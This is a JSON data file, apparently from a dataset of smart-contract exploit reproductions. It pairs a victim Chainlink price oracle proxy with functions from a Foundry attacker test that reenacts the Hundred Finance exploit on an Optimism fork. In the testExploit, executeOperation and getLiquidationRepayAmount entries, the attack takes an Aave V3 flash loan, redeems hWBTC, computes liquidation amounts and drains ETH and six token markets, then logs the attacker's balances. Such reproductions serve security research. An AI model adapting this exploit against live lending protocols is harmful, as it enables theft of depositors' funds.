[
  {
    "contract/interface": "IChainlinkPriceOracleProxy",
    "source_type": "victim_contract",
    "function_name": "getUnderlyingPrice",
    "original_code": "    function getUnderlyingPrice(CTokenInterface cToken)\n        external\n        view\n        returns (uint256);\n}\n\ncontract ChainlinkPriceOracleProxy is Ownable, PriceOracle {\n    using SafeMath for uint256;\n\n    /// @notice Indicator that this is a PriceOracle contract (for inspection)\n    bool public constant isPriceOracle = true;\n\n    address public ethUsdChainlinkAggregatorAddress;\n    address public bnbUsdChainlinkAggregatorAddress;\n    address public btcUsdChainlinkAggregatorAddress;\n\n    struct TokenConfig {\n        address chainlinkAggregatorAddress;\n        uint256 chainlinkPriceBase; // 0: Invalid, 1: USD, 2: ETH\n        uint256 underlyingTokenDecimals;\n    }\n\n    mapping(address => TokenConfig) public tokenConfig;\n\n    constructor(address ethUsdChainlinkAggregatorAddress_,\n                address bnbUsdChainlinkAggregatorAddress_,\n                address btcUsdChainlinkAggregatorAddress_) public {\n        ethUsdChainlinkAggregatorAddress = ethUsdChainlinkAggregatorAddress_;\n        bnbUsdChainlinkAggregatorAddress = bnbUsdChainlinkAggregatorAddress_;\n        btcUsdChainlinkAggregatorAddress = btcUsdChainlinkAggregatorAddress_;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address initator,\n        bytes calldata params\n    ) external payable returns (bool) {\n        hWBTC.redeem(hWBTC.balanceOf(address(this)));\n\n        console.log(\"1. ETH Drain \\r\");\n        ETHDrains();\n        console.log(\"2. SNX Drain \\r\");\n        tokenDrains(hSNX);\n        console.log(\"3. USDC Drain \\r\");\n        tokenDrains(hUSDC);\n        console.log(\"4. DAI Drain \\r\");\n        tokenDrains(hDAI);\n        console.log(\"5. USDT Drain\");\n        tokenDrains(hUSDT);\n        console.log(\"6. SUSD Drain\");\n        tokenDrains(hSUSD);\n        console.log(\"7. FRAX Drain \\r\");\n        tokenDrains(hFRAX);\n\n        WBTC.approve(address(aaveV3), type(uint256).max);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "getAddress",
    "original_code": "    function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {\n        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));\n        return address(uint160(uint256(hash)));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "getETHDrainCreationBytecode",
    "original_code": "    function getETHDrainCreationBytecode(\n        address token\n    ) public pure returns (bytes memory) {\n        bytes memory bytecode = type(ETHDrain).creationCode;\n        return abi.encodePacked(bytecode, abi.encode(token));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "getLiquidationRepayAmount",
    "original_code": "    function getLiquidationRepayAmount(\n        address hToken\n    ) public view returns (uint256) {\n        uint256 exchangeRate = hWBTC.exchangeRateStored();\n        uint256 liquidationIncentiveMantissa = 1_080_000_000_000_000_000;\n        uint256 priceBorrowedMantissa = priceOracle.getUnderlyingPrice(address(hToken));\n        uint256 priceCollateralMantissa = priceOracle.getUnderlyingPrice(address(hWBTC));\n        uint256 hTokenAmount = 1;\n        uint256 liquidateAmount = 1e18\n            / (\n                priceBorrowedMantissa * liquidationIncentiveMantissa\n                    / (exchangeRate * hTokenAmount * priceCollateralMantissa / 1e18)\n            ) + 1;\n        return liquidateAmount;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "gettokenDrainCreationBytecode",
    "original_code": "    function gettokenDrainCreationBytecode(\n        address token\n    ) public pure returns (bytes memory) {\n        bytes memory bytecode = type(tokenDrain).creationCode;\n        return abi.encodePacked(bytecode, abi.encode(token));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"optimism\", 90_760_765);\n        cheats.label(address(WBTC), \"WBTC\");\n        cheats.label(address(USDC), \"USDC\");\n        cheats.label(address(SNX), \"SNX\");\n        cheats.label(address(sUSD), \"sUSD\");\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(DAI), \"DAI\");\n        cheats.label(address(hWBTC), \"hWBTC\");\n        cheats.label(address(CEther), \"CEther\");\n        cheats.label(address(hSNX), \"hSNX\");\n        cheats.label(address(hUSDC), \"hUSDC\");\n        cheats.label(address(hDAI), \"hDAI\");\n        cheats.label(address(hUSDT), \"hUSDT\");\n        cheats.label(address(hSUSD), \"hSUSD\");\n        cheats.label(address(hFRAX), \"hFRAX\");\n        cheats.label(address(aaveV3), \"aaveV3\");\n        cheats.label(address(unitroller), \"unitroller\");\n        cheats.label(address(priceOracle), \"ChainlinkPriceOracleProxy\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "contractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        payable(address(0)).transfer(address(this).balance);\n        cheats.startPrank(HundredFinanceExploiter);\n        hWBTC.transfer(address(this), 1_503_167_295); // anti front-run\n        cheats.stopPrank();\n        aaveV3.flashLoanSimple(address(this), address(WBTC), 500 * 1e8, new bytes(0), 0);\n\n        emit log_named_decimal_uint(\"Attacker ETH balance after exploit\", address(this).balance, 18);\n        emit log_named_decimal_uint(\n            \"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n        emit log_named_decimal_uint(\"Attacker SNX balance after exploit\", SNX.balanceOf(address(this)), SNX.decimals());\n        emit log_named_decimal_uint(\n            \"Attacker sUSD balance after exploit\", sUSD.balanceOf(address(this)), sUSD.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), USDT.decimals()\n        );\n        emit log_named_decimal_uint(\"Attacker DAI balance after exploit\", DAI.balanceOf(address(this)), DAI.decimals());\n    }\n\n",
    "description": ""
  }
]